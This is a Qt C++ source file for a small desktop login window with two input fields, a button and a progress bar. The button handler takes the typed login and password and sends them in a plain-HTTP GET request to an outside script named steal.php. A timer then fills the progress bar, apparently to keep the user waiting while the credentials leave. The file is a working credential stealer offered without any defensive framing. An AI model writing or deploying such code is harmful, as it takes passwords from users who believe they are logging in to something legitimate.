#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QtNetwork/QNetworkAccessManager>
#include <QUrl>
#include <QtNetwork/QNetworkRequest>
#include <QCoreApplication>
#include <QDebug>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QUrl>
#include <QUrlQuery>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ui->label->setText("Пока, мир!");
    connect(ui->pushButton, SIGNAL(clicked()),
            this, SLOT(pushButton()));
}

MainWindow::~MainWindow()
{
    delete ui;
}
void MainWindow::changeProgress()
{
    ui->progressBar->setValue(ui->progressBar->value()+10);
}
void MainWindow::pushButton() {
   QEventLoop eventLoop;

   // "quit()" the event-loop, when the network request "finished()"
   QNetworkAccessManager mgr;
   QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));

   // the HTTP request
   QNetworkRequest req( QUrl(
           QString("http://roctbb.ru/steal.php?login="
                 + ui->lineEdit->text()+
                 "&password="+ui->lineEdit_2->text()
                   ) ) );
       QNetworkReply *reply = mgr.get(req);
   eventLoop.exec(); // blocks stack until "finished()" has been called

   if (reply->error() == QNetworkReply::NoError) {
       //success
       qDebug() << "Success" <<reply->readAll();
       delete reply;
   }
   else {
       //failure
       qDebug() << "Failure" <<reply->errorString();
       delete reply;
   }
    timer.setInterval(1000);
    connect(&timer, SIGNAL(timeout()),
            this, SLOT(changeProgress()));
    timer.start();
}
